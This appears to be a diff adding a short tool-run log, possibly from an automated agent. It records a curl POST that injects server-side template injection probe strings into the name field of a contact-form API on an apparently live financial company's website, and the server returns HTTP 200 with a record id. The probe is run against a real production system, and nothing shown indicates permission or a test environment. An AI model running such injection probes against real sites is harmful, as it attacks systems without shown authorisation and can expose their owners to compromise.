@@ -1,0 +1,15 @@
+# command: cd "$WORK_PATH"; UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36'
+echo "=== SSTI in fname ==="
+curl -sk -X POST https://www.infinitycapital.bh/api/send -A "$UA" \
+  --data-urlencode 'fname={{7*7}}${7*7}<%= 7*7 %>#{(7*7)}' \
+  --data-urlencode 'lname=b' --data-urlencode 'areacode=973' --data-urlencode 'tel=5551234' \
+  --data-urlencode 'cname=p@test.invalid' --data-urlencode 'subject=s' --data-urlencode 'msg=m' \
+  --data-urlencode 'check=on' --data-urlencode 'targets=p@test.invalid' -w "\nHTTP:%{http_code}\n" | tail -3
+# tool: tail
+# exit_code: 0
+# ts: 2026-09-30T11:25:27.653908+00:00
+# ---
+
+=== SSTI in fname ===
+{"data":{"id":"01a0f20f-f646-7371-8b3b-52b8a056813e"},"error":null}
+HTTP:200
